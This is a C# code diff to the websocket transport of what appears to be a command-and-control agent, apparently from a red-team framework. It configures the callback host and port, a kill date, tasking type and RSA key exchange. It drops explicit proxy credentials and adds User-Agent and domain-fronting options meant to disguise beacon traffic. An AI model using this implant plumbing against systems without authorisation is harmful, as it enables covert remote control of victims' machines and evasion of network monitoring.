@@ -29,12 +29,10 @@ namespace WebsocketTransport
         // synthesis of CallbackHost, CallbackPort, PostUri
         private string Endpoint;
         private bool EncryptedExchangeCheck;
-        private string ProxyHost;
-        private string ProxyPort;
-        private string ProxyUser;
-        private string ProxyPass;
+        private string UserAgent;
         private string TaskingType;
         private string KillDate;
+        private string DomainFront;
         // synthesis of ProxyHost and ProxyPort
         private string ProxyAddress;
         private Dictionary<string, string> _additionalHeaders = new Dictionary<string, string>();
@@ -59,28 +57,18 @@ namespace WebsocketTransport
             CallbackPort = int.Parse(data["callback_port"]);
             CallbackHost = data["callback_host"];
             TaskingType = data["tasking_type"];
+            UserAgent = data["USER_AGENT"];
             Uuid = agent.GetUUID();
             PostUri = data["ENDPOINT_REPLACE"];
+            DomainFront = data["domain_front"];
             EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
-            //ProxyHost = data["proxy_host"];
-            //ProxyPort = data["proxy_port"];
             rsa = agent.GetApi().NewRSAKeyPair(4096);
-            if (!string.IsNullOrEmpty(ProxyPort))
-            {
-                ProxyAddress = string.Format("{0}:{1}", ProxyHost, ProxyPort);
-            }
-            else
-            {
-                ProxyAddress = ProxyHost;
-            }
 
             if (PostUri[0] != '/')
             {
                 PostUri = $"/{PostUri}";
             }
             Endpoint = string.Format("{0}:{1}", CallbackHost, CallbackPort);
-            //ProxyUser = data["proxy_user"];
-            //ProxyPass = data["proxy_pass"];
             KillDate = data["killdate"];
 
             string[] reservedStrings = new[]
@@ -89,13 +77,10 @@ namespace WebsocketTransport
                 "callback_jitter",
                 "callback_port",
                 "callback_host",
-                "post_uri",
+                "ENDPOINT_REPLACE",
                 "encrypted_exchange_check",
-                "proxy_host",
-                "proxy_port",
-                "proxy_user",
-                "proxy_pass",
                 "killdate",
+                "USER_AGENT"
             };
 
             foreach (string k in data.Keys)
@@ -256,21 +241,13 @@ namespace WebsocketTransport
                     };
                 }
                 
+                //TODO TEST
+                // Use Default Proxy and Cached Credentials for Internet Access
 
-                if (!string.IsNullOrEmpty(ProxyAddress))
-                {
-                   Client.SetProxy("http://"+ProxyAddress, ProxyUser, ProxyPass);
-                }
-                else
-                {
-                    //TODO TEST
-                    // Use Default Proxy and Cached Credentials for Internet Access
-
-                    IWebProxy wr = WebRequest.GetSystemWebProxy();
-                    wr.Credentials = CredentialCache.DefaultCredentials;
-                    //Client.Proxy = wr;
-                }
-
+                IWebProxy wr = WebRequest.GetSystemWebProxy();
+                wr.Credentials = CredentialCache.DefaultCredentials;
+                //Client.Proxy = wr;
+                
                 Client.ConnectAsync();
                 Client.OnOpen += OnAsyncConnect;
                 Client.OnMessage += OnAsyncMessageReceived;
